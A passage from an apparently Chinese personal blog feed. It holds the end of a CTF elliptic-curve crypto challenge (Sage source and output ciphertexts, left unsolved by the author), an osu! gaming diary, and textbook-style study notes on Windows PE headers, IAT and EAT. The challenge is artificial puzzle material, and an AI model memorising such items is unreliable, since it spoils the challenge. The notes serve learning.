class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        x = ciphertext</span><br><span class="line">        w = x^<span class="number">3</span> + self.a*x + self.b % self.N</span><br><span class="line"></span><br><span class="line">        P.&lt;Yp&gt; = PolynomialRing(Zmod(self.p))</span><br><span class="line">        fp = x^<span class="number">3</span> + self.a*x + self.b -Yp^<span class="number">2</span></span><br><span class="line">        yp = fp.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        P.&lt;Yq&gt; = PolynomialRing(Zmod(self.q))</span><br><span class="line">        fq = x^<span class="number">3</span> + self.a*x + self.b -Yq^<span class="number">2</span></span><br><span class="line">        yq = fq.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        y = crt([<span class="built_in">int</span>(yp), <span class="built_in">int</span>(yq)], [self.p, self.q])</span><br><span class="line"></span><br><span class="line">        cp, cq = self.Ep((x, y)), self.Eq((x, y))</span><br><span class="line">        legendre_symbol_p = legendre_symbol(w, self.p)</span><br><span class="line">        legendre_symbol_q = legendre_symbol(w, self.q)</span><br><span class="line"></span><br><span class="line">        mp = (self.d[(legendre_symbol_p, legendre_symbol_q)] * cp).xy()</span><br><span class="line">        mq = (self.d[(legendre_symbol_p, legendre_symbol_q)] * cq).xy()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> crt([<span class="built_in">int</span>(mp[<span class="number">0</span>]), <span class="built_in">int</span>(mq[<span class="number">0</span>])], [self.p, self.q]) &gt;&gt; self.Kbits</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">msg_to_point</span>(<span class="params">self, x, shift=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> shift:</span><br><span class="line">            x &lt;&lt;= self.Kbits</span><br><span class="line">        res_point = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> &lt;&lt; self.Kbits):</span><br><span class="line">            P.&lt;Yp&gt; = PolynomialRing(Zmod(self.p))</span><br><span class="line">            fp = x^<span class="number">3</span> + self.a*x + self.b - Yp^<span class="number">2</span></span><br><span class="line">            P.&lt;Yq&gt; = PolynomialRing(Zmod(self.q))</span><br><span class="line">            fq = x^<span class="number">3</span> + self.a*x + self.b - Yq^<span class="number">2</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                yp, yq = <span class="built_in">int</span>(fp.roots()[<span class="number">0</span>][<span class="number">0</span>]), <span class="built_in">int</span>(fq.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">                y = crt([yp, yq], [self.p, self.q])</span><br><span class="line">                E = EllipticCurve(IntegerModRing(self.p*self.q), [self.a, self.b])</span><br><span class="line">                res_point = E.point((x, y))</span><br><span class="line">                <span class="keyword">return</span> res_point</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res_point</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ecc1 = ECC(a, b, p, q, e1)</span><br><span class="line">ecc2 = ECC(a, b, p, q, e2)</span><br><span class="line">ecc3 = ECC(a, b ,p, q, e3)</span><br><span class="line">gift = p * q * getPrime(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">secret = bytes_to_long(flag[<span class="number">7</span>:-<span class="number">1</span>].encode())</span><br><span class="line">ciphertext1 = ecc1.enc(secret)</span><br><span class="line">ciphertext2 = ecc2.enc(secret)</span><br><span class="line">ciphertext3 = ecc3.enc(secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    </span><br><span class="line">    f.write(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;e3 = <span class="subst">&#123;e3&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;gift = <span class="subst">&#123;gift&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C1 = <span class="subst">&#123;ciphertext1&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C2 = <span class="subst">&#123;ciphertext2&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C3 = <span class="subst">&#123;ciphertext3&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>附件:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e1 = <span class="number">516257683822598401</span></span><br><span class="line">e2 = <span class="number">391427904712695553</span></span><br><span class="line">e3 = <span class="number">431785901506020973</span></span><br><span class="line">gift = <span class="number">10954621221812651197619957228527372749810730943802288293715079353550311138677754821746522832935330138708418986232770630995550582619687239759917418738050269898943719822278514605075330569827210725314869039623167495140328454254640051293396463956732280673238182897228775094614386379902845973838934549168736103799539422716766688822243954145073458283746306858717624769112552867126607212724068484647333634548047278790589999183913</span></span><br><span class="line">C1 = (<span class="number">1206929895217993244310816423179846824808172528120308055773133254871707902120929022352908110998765937447485028662679732041</span>, <span class="number">652060368795242052052268674691241294013033011634464089331399905627588366001436638328894634036437584845563026979258880828</span>)</span><br><span class="line">C2 = (<span class="number">1819289899794579183151870678118089723240127083264590266958711858768481876209114055565064148870164568925012329554392844153</span>, <span class="number">1110245535005295568283994217305072930348872582935452177061131445872842458573911993488746144360725164302010081437373324551</span>)</span><br><span class="line">C3 = (<span class="number">1112175463080774353628562547288706975571507012326470665917118873336738873653792420189391867408691423887642725415133046354</span>, <span class="number">1820636035485820691083758790204536675748006232767111209985774382700260408550258280489088658228739971137550264759084468620</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ECC学的还是太肤浅了 恶补一下ECC再来看吧。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>osu</title>
      <link href="/osu/"/>
      <url>/osu/</url>
      
        <content type="html"><![CDATA[<p><strong>Welcome to osu!</strong></p><span id="more"></span><h1 id="OWC2023-Korea-VS-USA"><a href="#OWC2023-Korea-VS-USA" class="headerlink" title="OWC2023 Korea VS USA"></a>OWC2023 Korea VS USA</h1><p>很好奇为什么要连着打两场？<br>masaka第一场算是胜者组决赛 然后bracket reset再来打真正的grandfinal？🤖</p><p><img src="https://s2.loli.net/2023/12/03/QslebCr415jmOwY.png" alt="img"></p><p><img src="https://s2.loli.net/2023/12/03/Yuv79oQjWOH6npJ.png" alt="img"></p><p>How Could He make it!!!WTF!!! MY GOD WORST_HR_PLAYER!!!!</p><p>FM的strategy：</p><p><img src="https://s2.loli.net/2023/12/03/URiJLec6dNvSklo.png" alt="img"></p><p>flyingtuna一人承担所有 然后让Karcher打NM(other than HR)FC<br>what  a textbook strategy！！！ wow !!!</p><p>Are you kidding me ??? lol😂</p><p><img src="https://s2.loli.net/2023/12/03/ny1Cz9uobixJlaF.png" alt="img"></p><p>How can you hit without anything? lol.O(∩_∩)O</p><p>Finally, we have TieBreaker…<br>WTF TB: 8.60⭐ length:6:43 WTF</p><p><img src="https://s2.loli.net/2023/12/04/hXvoSkIZlO2yu8L.png" alt="img"></p><p>哎 USA几连冠了啊… Korea太可惜了啊啊！ 为什么最后TB不上worst_hr_player 啊！！！！！！！ 太可惜了吧~</p><h1 id="2023-12-23"><a href="#2023-12-23" class="headerlink" title="2023.12.23"></a>2023.12.23</h1><p>纪念第一个1000x combo 虽说这首歌中间奇奇怪怪的(有种Another即听感) 但打combo真的好打</p><p><img src="https://s2.loli.net/2023/12/24/EMova73NsVb4RCw.png" alt="img"></p><p>这首也终于打到A了</p><p><img src="https://s2.loli.net/2023/12/24/ZG4S8oBClv9x6Tm.png" alt="img"></p><h1 id="2024-1-27"><a href="#2024-1-27" class="headerlink" title="2024.1.27"></a>2024.1.27</h1><p>考完期末后的两天打了好多比较好的谱<br><img src="/osu/images/image.png" alt="img"><br><img src="/osu/images/image-1.png" alt="img"><br><img src="/osu/images/image-2.png" alt="img"><br><img src="/osu/images/image-3.png" alt="img"><br><img src="/osu/images/image-4.png" alt="img"></p><h1 id="2024-3-1"><a href="#2024-3-1" class="headerlink" title="2024.3.1"></a>2024.3.1</h1><p>寒假结束后换个皮肤手感瞬间提升 都开始打<code>5*</code>的谱了</p><p><img src="/osu/images/image-20240301113131068.png" alt="img"><br><img src="/osu/images/image-5.png" alt="img"><br><img src="/osu/images/image-6.png" alt="img"><br><img src="/osu/images/image-7.png" alt="img"><br><img src="/osu/images/image-8.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> osu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理-C13-PE文件格式-笔记</title>
      <link href="/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-C13-PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F-%E7%AC%94%E8%AE%B0/"/>
      <url>/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-C13-PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>逆向工程核心原理-C13-PE文件格式-笔记</p><span id="more"></span><p>前几周粗浅看了一遍 由于是电子版 也没留下多大印象<br>最近CTF的re题看着太累了 做一个题挺耗时间的 想着是基础还是不够扎实<br>再者学逆向的目的也不全是CTF 掌握些理论还是很重要的<br>再来重新学一学 写篇笔记记录一下关键点 也启发自己思考</p><h1 id="13-1-介绍"><a href="#13-1-介绍" class="headerlink" title="13.1 介绍"></a>13.1 介绍</h1><p>PE32 &amp; PE+&#x2F;PE32+ 别写PE64 :(闹笑话</p><h1 id="13-2-PE文件格式"><a href="#13-2-PE文件格式" class="headerlink" title="13.2 PE文件格式"></a>13.2 PE文件格式</h1><p>学习PE文件格式就是学习PE头中的结构体<br><strong>十分重要！！！</strong></p><h2 id="13-2-1-基本结构"><a href="#13-2-1-基本结构" class="headerlink" title="13.2.1 基本结构"></a>13.2.1 基本结构</h2><p>DOS头到节区头是PE头部分(4D 5A … 50 45)<br>文件中使用偏移(offset) 内存中使用VA(虚拟地址)来表示位置 当文件加载到内存中时情况会改变 内容分为 .text .data .rsrc分别保存</p><h2 id="13-2-2-VA-RVA"><a href="#13-2-2-VA-RVA" class="headerlink" title="13.2.2 VA&amp;RVA"></a>13.2.2 VA&amp;RVA</h2><p>RVA(相对虚拟地址) + ImageBase(基准位置) &#x3D; VA<br>PE头内部信息大多以RVA形式 因为PE(尤其是DLL)加载到进程虚拟内存时由于该位置已经加载其他PE(DLL) 要通过重定位加载到其他空白的位置<br>用RVA就只需要记录ImageBase就可以得到VA</p><h1 id="13-3-PE头"><a href="#13-3-PE头" class="headerlink" title="13.3 PE头"></a>13.3 PE头</h1><h2 id="13-3-1-DOS头"><a href="#13-3-1-DOS头" class="headerlink" title="13.3.1 DOS头"></a>13.3.1 DOS头</h2><p>重点关注两个成员</p><ul><li>e_magic: DOS签名 (4D5A &#x3D;&gt; “MZ”)</li><li>e_lfanew: 指示NT头的偏移 (不同文件值可变)</li></ul><p>在书给的exe中 e_lfanew的值为 000000E0(小端序!)</p><h2 id="13-3-2-DOS存根"><a href="#13-3-2-DOS存根" class="headerlink" title="13.3.2 DOS存根"></a>13.3.2 DOS存根</h2><p>40~4D为汇编指令(有兴趣把它写入文件IDA康康)<br>主要就是用来输出一下”This program … DOS mode”就退出了 算是一种对于MS-DOS的兼容</p><h2 id="13-3-3-NT头"><a href="#13-3-3-NT头" class="headerlink" title="13.3.3 NT头"></a>13.3.3 NT头</h2><p>NT头的IMAGE_NT_HEADERS</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">  DWORD                   Signature;    <span class="comment">//签名</span></span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;   <span class="comment">//文件头</span></span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader; <span class="comment">//可选头</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure><p>signature即为50450000(“PE”00)<br>IMAGE_NT_HEADERS结构体总大小为F8 很大</p><h2 id="13-3-4-NT头-文件头"><a href="#13-3-4-NT头-文件头" class="headerlink" title="13.3.4 NT头: 文件头"></a>13.3.4 NT头: 文件头</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  WORD  Machine;</span><br><span class="line">  WORD  NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD  SizeOfOptionalHeader;</span><br><span class="line">  WORD  Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>Machine: 每个CPU都有唯一的machine码</li><li>NumberOfSections: 文件中存在的节区数量</li><li>SizeOfOptionalHeader: IMAGE_OPTIONAL_HEADER64结构体大小</li><li>Characteristics: 标识文件属性 是否可运行 是否为DLL等</li><li>TimeDateStamp: 该成员的值不影响运行 用来记录时间而已</li></ul><h2 id="13-3-5-NT头-可选头"><a href="#13-3-5-NT头-可选头" class="headerlink" title="13.3.5 NT头: 可选头"></a>13.3.5 NT头: 可选头</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;</span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  DWORD                BaseOfData;</span><br><span class="line">  DWORD                ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;</span><br><span class="line">  DWORD                FileAlignment;</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  DWORD                SizeOfStackReserve;</span><br><span class="line">  DWORD                SizeOfStackCommit;</span><br><span class="line">  DWORD                SizeOfHeapReserve;</span><br><span class="line">  DWORD                SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>重点关注以下成员</p><ul><li>Magic: IMAGE_OPTIONAL_HEADER为32位-10B 64位-20B</li><li><strong>AddressOfEntryPoint</strong>: 持有EP的RVA值！！！ 指出程序最先执行代码起始地址！！！</li><li>ImageBase: 在PE文件被加载到内存时 指出有限装载的地址<br>EXE DLL被装载到用户内存的0 ~ 7FFFFFFF    SYS被装载到内核内存的80000000 ~ FFFFFFFF<br>一般而言 用开发工具创建EXE后 ImageBase值为00400000 DLL文件的ImageBase值为10000000(也可为其他值)<br>执行PE文件时 PE装载器先创建进程 再将文件载入内存 然后把EIP设置为ImageBase+AddressOfEntryPoint</li><li>SectionAlignment FileAlignment: PE文件的body部分被划分为节区<br>FileAlignment指定了节区在磁盘文件中的最小单位<br>SectionAlignment则指定了节区在内存中的最小单位</li><li>SizeOfImage: 加载PE文件到内存时 SizeOfImage指定了PE Image在虚存中所占空间大小</li><li>SizeOfHeaders: 指出整个PE头的大小<br>第一节区所在位置与SizeOfHeaders距文件开始的offset相同</li><li>Subsystem: 区分驱动文件(.sys)和普通的可执行文件(.exe .dll)</li><li>NumberOfRvaAndSizes: 指定最后一个成员DataDirectory数组的个数(大小不一定为16)</li><li>DataDirectory:<br><img src="https://s2.loli.net/2023/12/03/IVkU3uvCy9dxPJZ.png" alt="img"><br>重点关注0,1,9 EXPORT IMPORT TLS</li></ul><h2 id="13-3-6-节区头"><a href="#13-3-6-节区头" class="headerlink" title="13.3.6 节区头"></a>13.3.6 节区头</h2><p>PE文件被创建为多个节区结构(更加安全 eg.一定程度上防止缓冲区溢出)</p><ul><li>code: 执行 可读取</li><li>data: 非执行 可读写</li><li>resource: 非执行 可读取</li></ul><p>各个节区的属性被记录在节区头中</p><p>IMAGE_SECTION_HEADER</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;</span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><ul><li>VirtualSize: 内存中节区所占大小</li><li>VirtualAddress: 内存中节区起始位置(RVA)</li><li>SizeOfRawData: 磁盘文件中节区所占大小</li><li>PointerToRawData: 磁盘文件中节区起始位置</li><li>Characteristics: 节区属性(bit OR)</li></ul><p>其中VirtualAddress和PointerToRawData不带有任何值 由可选头中的SectionAlignment和FileAlignment确定<br>VirtualSize和SizeOfRawData值一般不同!<br>最后看看Name字段 可以向其中放入任何值(甚至可以NULL填充)</p><p><img src="https://s2.loli.net/2023/12/03/VcswHEPriI5SOgB.png" alt="img"></p><h1 id="13-4-RVA-to-RAW"><a href="#13-4-RVA-to-RAW" class="headerlink" title="13.4 RVA to RAW"></a>13.4 RVA to RAW</h1><p><img src="https://s2.loli.net/2023/12/03/bVn7942XuTZ18OY.png" alt="img"><br>即磁盘到内存的映射<br>方法:</p><ol><li>查找RVA所在节区</li><li>公式计算偏移(RAW)<br><code>offset = RAW - PointerToRawData = RVA - VitrualAddress </code></li></ol><p>几个练习:<br><img src="https://s2.loli.net/2023/12/03/VcswHEPriI5SOgB.png" alt="img"></p><p>Q1. RVA &#x3D; 5000时 FileOffset &#x3D; ?<br>A1. RVA:第一节区 PTR&#x3D;RawAddress &#x3D; 400 VA &#x3D; 1000 &#x3D;&gt; RAW &#x3D; 4400</p><p>Q2. RVA &#x3D; 13314<br>A2. 第三节区 VA &#x3D; B000 PTR &#x3D; 8400 &#x3D;&gt; RAW &#x3D; 10714</p><p>Q3. RVA &#x3D; ABA8<br>A3. 第二节区 VA&#x3D;9000 PTR &#x3D; 7C00 &#x3D;&gt; RAW &#x3D; 97A8<br>发现算出来偏移在第三节区 说明”无法定义RVA(ABA8)相对应的RAW值”<br>原因: 第二节区的 VirtualSize比RawSize大!</p><h1 id="13-5-IAT"><a href="#13-5-IAT" class="headerlink" title="13.5 IAT"></a>13.5 IAT</h1><p><strong>难点来了</strong><br>IAT: 导入地址表(Import Address Table)<br>IAT保存的内容与Windows操作系统的核心进程 内存 DLL结构等有关<br>简言之 IAT是一种表格 用来记录程序正在使用哪些库中的哪些函数</p><h2 id="13-5-1-DLL"><a href="#13-5-1-DLL" class="headerlink" title="13.5.1 DLL"></a>13.5.1 DLL</h2><p>相比早期只有库(library) DLL</p><ul><li>不需要把库包含在程序中 单独组成DLL文件 需要时调用即可</li><li>内存映射技术使加载后的DLL代码 资源 能在多个进程中实现共享</li><li>更新库时只需要替换相关DLL文件即可</li></ul><p>加载DLL的两种方式</p><ul><li>显示链接: 程序使用DLL时加载 使用完毕后释放内存</li><li>隐式链接: 程序一开始就一同加载DLL 程序终止时再释放占用的内存  IAT机制与这种链接方式有关</li></ul><p>OllyDbg查看notepad.exe</p><p><img src="https://s2.loli.net/2023/12/03/3XKFV2lzoc18G7j.png" alt="img"></p><p>这里可以看到<br>调用CreateFileW()时并非直接调用而是获取01001104处的地址来实现(所有API调用均如此)<br>地址01001104是.text节区的内存区域(IAT内存区域) 地址的值7645EA70即为加载到exe进程内存中CreateFileW()函数(位于kernel32.dll库)的地址<br>比较书和本地可以发现 01001104地址的值有差异 这也是为什么通过01001104而不是通过它指向的地址的值来调用<br>同时由于DLL的重定位 导致无法对实际地址硬编码 同时PE头中表示地址时使用的是RVA而不是VA</p><h2 id="13-5-2-IMAGE-IMPORT-DECRIPTOR"><a href="#13-5-2-IMAGE-IMPORT-DECRIPTOR" class="headerlink" title="13.5.2 IMAGE_IMPORT_DECRIPTOR"></a>13.5.2 IMAGE_IMPORT_DECRIPTOR</h2><p>IMAGE_IMPORT_DECRIPTOR结构体记录着PE文件要导入哪些库文件<br>IMAGE_IMPORT_DECRIPTOR结构体数组也被称为IMPORT Directory Table (导入目录)<br>导入多少个库就意味着有多少个IMAGE_IMPORT_DECRIPTOR结构体</p><p><img src="https://s2.loli.net/2023/12/03/au16VZ8spBbtfmH.png" alt="img"></p><ul><li>OriginalFirstThunk(OFT): INT的地址(RVA)</li><li>Name: 库名称字符串的地址(RVA)</li><li>FirstThunk(FT): IAT的地址(RVA)</li></ul><p>提示:</p><ul><li>PE头中提到的table均指数组</li><li>INT和IAT是长整型 以NULL结束</li><li>INT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针</li><li>INT与IAT大小应相同</li></ul><p><img src="https://s2.loli.net/2023/12/03/XWDsoRfdbH8ZJFx.png" alt="img"></p><p>这张图中 INT和IAT各元素同时指向相同地址 但很多情况下他们是不一致的 要注意</p><p>简单了解下PE装载器把导入函数输入IAT的顺序:</p><ol><li>读取IID的Name成员 获取库名称字符串(“kernel32.dll”)</li><li>装载相应库 -&gt; LoadLibrary(“kernel32.dll”)</li><li>读取IID中OFT成员 获取INT地址</li><li>逐一读取INT数组中的值 获取相应IMAGE_IMPORT_BY_NAME地址(RVA)</li><li>使用IIBN的Hint(ordinal)或Name项 获得相应函数的起始地址</li><li>读取IID的FT(IAT)成员 获得IAT地址</li><li>将上面获取的函数地址输入相应的IAT数组值</li><li>重复4-7 直至INT结束(遇到NULL)</li></ol><h2 id="13-5-3-使用notepad-exe练习"><a href="#13-5-3-使用notepad-exe练习" class="headerlink" title="13.5.3 使用notepad.exe练习"></a>13.5.3 使用notepad.exe练习</h2><p>首先要明确 IMAGE_IMPORT_DECRIPTOR结构体不在PE头而在PE体中 但查找其位置的信息在PE头中<br>前面提到过 NT头中可选头最后一个成员DataDirectory的 [1]记录的就是IMAGE_IMPORT_DECRIPTOR结构体的起始位置(RVA)<br>值为7604<br>RVA-&gt;RAW: 第一节区 RAW&#x3D;0x7604-0x1000+0x400 &#x3D; 6A04<br>WinHEX中找到 可以看到OFT(INT)的RVA值为7990 -&gt; RAW: 6D90   Name RVA:7AAC -&gt; RAW:6EAC  FT(IAT) RVA:12C4-&gt; RAW:6C4<br>跟踪Name可以看到 comdlg.dll字符串<br>跟踪INT 第一个值为7A7A(RVA) -&gt; RAW:6E7A<br>INT是IMAGE_IMPORT_BY_NAME结构体指针数组 数组第一个元素指向函数的Ordinal值000F 函数的名称为PageSetupDlgW<br>跟踪IAT(RAW:6C4) 找到对应comdlg32.dll库</p><p>在OllyDbg中查看<br>该exe的ImageBase是01000000所以PageSetupDlgW函数的IAT地址为010012C4 其值为75B83F20 是API的准确起始地址<br>在OD中转到75B83F20对应的反汇编可以看到正是函数开始的地址</p><p>IAT真的很重要！ 这些操作要自己多练才能够熟悉<br>尤其是注意到IAT的第一个元素被硬编码成76324906 但是OD中实际地址应该是75B83F20！！ 所以要利用ImageBase+dll’sIAT(RVA)来找!</p><h1 id="13-6-EAT"><a href="#13-6-EAT" class="headerlink" title="13.6 EAT"></a>13.6 EAT</h1><p>继续学习EAT<br>EAT使得不同的应用程序可以调用库文件中提供的函数 对应于DLL&#x2F;SYS (IAT对应于exe)<br>只有通过EAT才能准确求得从相应库中导出函数的起始地址<br>对应 IMAGE_EXPORT_DIRECTORY PE文件中仅有一个IMAGE_EXPORT_DIRECTORY结构体</p><p>NT可选头的DataDirectory[0].VitrualAdddress的值即为IED结构体数组的起始地址(RVA)<br>再复习下: DataDirectory有两个DWORD成员 VitrualAddress和Size<br>用CFF和WinHex查看<br>ExportDirectory的RVA偏移为168 值为262C &#x3D;&gt; RAW:1A2C<br>ED的size偏移为16C 值为6CFD</p><h2 id="13-6-1-IMAGE-EXPORT-DIRECTORY"><a href="#13-6-1-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="13.6.1 IMAGE_EXPORT_DIRECTORY"></a>13.6.1 IMAGE_EXPORT_DIRECTORY</h2><p>下面介绍IMAGE_EXPORT_DIRECTORY结构体中的重要成员</p><ul><li>NumberOfFunctions: 实际Export函数的个数</li><li>NumberOfNames: Export函数中具有名字的函数个数</li><li>AddressOfFunctions: Export函数地址数组</li><li>AddressOfNames: 函数名称地址数组</li><li>AddressOfNameOrdinals: Ordinal地址数组</li></ul><p>kernel32.dll:</p><p><img src="https://s2.loli.net/2023/12/04/qanN2eP5TIwLRBv.png" alt="img"></p><p>从库中获取函数地址的API为GetProcAddress()函数 该API通过引用EAT来获取指定API的地址<br>GetProcAddress()操作原理:</p><ol><li>利用AddressOfNames成员转到函数名称数组</li><li>函数名称数组中存储着字符串的地址 通过strcmp比较字符串 查找指定函数的名称(此时数组索引记为name_index)</li><li>利用AddressOfNameOrdinals成员 转到ordinal数组</li><li>在ordinal数组中通过name_index查找相应ordinal的值</li><li>利用AddressOfFunctions成员转到函数地址数组(EAT)</li><li>利用4中求到的ordinal值作为数组索引 在EAT中获得指定函数的起始地址</li></ol><h2 id="13-6-2-使用kernel32-dll练习"><a href="#13-6-2-使用kernel32-dll练习" class="headerlink" title="13.6.2 使用kernel32.dll练习"></a>13.6.2 使用kernel32.dll练习</h2><p>练习从kernel32.dll文件的EAT中查找AddAtomW函数<br>前面计算过IMAGE_EXPORT_DIRECTORY的RAW偏移为1A2C(CFF好像转到输出目录直接就能看)<br>WinHex中找到<br>AddressOfName: offset:1A4C 值:3538(RVA) -&gt; RAW:2938<br>找打第三个地址: 4BB3(RVA) -&gt; RAW:3FB3<br>找到查看 